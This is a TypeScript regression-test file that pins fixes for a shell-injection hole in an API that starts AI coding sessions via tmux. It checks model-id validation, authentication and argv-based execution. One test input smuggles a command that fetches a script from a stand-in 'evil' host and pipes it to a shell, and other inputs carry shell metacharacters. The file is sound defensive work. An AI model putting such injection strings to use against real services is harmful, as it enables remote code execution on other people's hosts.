/**
 * SECURITY (2026-07-29): the session control surface must not be shell-injectable.
 *
 * `POST /api/session/start` accepts a caller-supplied `model` and `prompt`, and the
 * old implementation interpolated both into a single shell string:
 *
 *   execSync(`tmux ... send-keys -t ${session} '${claudeCmd}' Enter`)
 *
 * A single apostrophe in either value closed the outer quotes and everything after
 * it ran as a shell command on the host — under `--dangerously-skip-permissions`.
 * These tests pin the two defences: a strict model-id alphabet, and argv-based
 * execution so no shell parses the prompt at all.
 */

import { describe, it, expect } from 'vitest';
import { isValidModelId } from '../../sessionManager';

describe('session control — model id validation', () => {
  it('accepts the model ids we actually use', () => {
    for (const model of ['sonnet', 'opus', 'haiku', 'claude-opus-5', 'claude-haiku-4-5-20251001']) {
      expect(isValidModelId(model)).toBe(true);
    }
  });

  it('refuses quote characters that would close an enclosing shell quote', () => {
    expect(isValidModelId("x'; curl http://evil/s | sh; echo '")).toBe(false);
    expect(isValidModelId('x"; id; echo "')).toBe(false);
  });

  it('refuses shell metacharacters even without quotes', () => {
    for (const model of ['sonnet;id', 'sonnet|id', 'sonnet&&id', 'sonnet$(id)', 'sonnet`id`', 'sonnet\nid']) {
      expect(isValidModelId(model)).toBe(false);
    }
  });

  it('refuses the empty string and absurdly long values', () => {
    expect(isValidModelId('')).toBe(false);
    expect(isValidModelId('a'.repeat(65))).toBe(false);
  });
});

describe('session control — the router is behind authentication', () => {
  it('mounts /api/session and /api/sessions with authenticateRest', async () => {
    // The P0 was not a weak auth check — it was no auth check at all: the session
    // router was mounted bare while /api/mailbox next to it was gated. `fromTerminal`
    // in the request body is caller-asserted and cannot stand in for authentication.
    const fs = await import('fs');
    const path = await import('path');
    const source = fs.readFileSync(
      path.join(__dirname, '..', '..', 'bootstrap', 'app.ts'),
      'utf8',
    );

    for (const mount of ['/api/session', '/api/sessions']) {
      const pattern = new RegExp(
        `app\\.use\\('${mount}',\\s*authenticateRest,\\s*sessionRoutes\\)`,
      );
      expect(source).toMatch(pattern);
    }
  });
});

describe('session control — no shell in the start path', () => {
  it('builds the tmux invocation as argv, not as a shell string', async () => {
    // The regression this guards: any reintroduction of `execSync(`tmux ... '${cmd}'`)`.
    // We read the source rather than the behaviour because the dangerous form is a
    // syntactic property — it is unsafe even when the current inputs happen to be benign.
    const fs = await import('fs');
    const path = await import('path');
    const source = fs.readFileSync(
      path.join(__dirname, '..', '..', 'sessionManager.ts'),
      'utf8',
    );

    const startSessionBody = source.slice(
      source.indexOf('export async function startSession'),
      source.indexOf('export async function injectPrompt'),
    );

    expect(startSessionBody).toContain("execFileSync('tmux'");
    expect(startSessionBody).not.toMatch(/execSync\(`tmux[^`]*send-keys/);
    expect(startSessionBody).not.toMatch(/execSync\(`tmux[^`]*new-session/);
  });
});

describe('session starter — no shell interpolation', () => {
  it('uses argv for tmux and curl, validates model ids, and uses timers for delays', async () => {
    const fs = await import('fs');
    const path = await import('path');
    const source = fs.readFileSync(
      path.join(__dirname, '..', '..', 'sessionStarter.ts'),
      'utf8',
    );

    expect(source).toContain("import { isValidModelId } from './sessionManager'");
    expect(source.match(/isValidModelId\(model\)/g)).toHaveLength(2);
    expect(source).toContain("execFileSync('tmux'");
    expect(source).toContain("execFileAsync('tmux'");
    expect(source).toContain("execFileAsync('curl'");
    expect(source).not.toMatch(/\bexec(?:Sync|Async)\(/);
    expect(source).not.toMatch(/\bexec(?:Sync|Async)\(\s*['"`]?sleep\b/);
  });
});
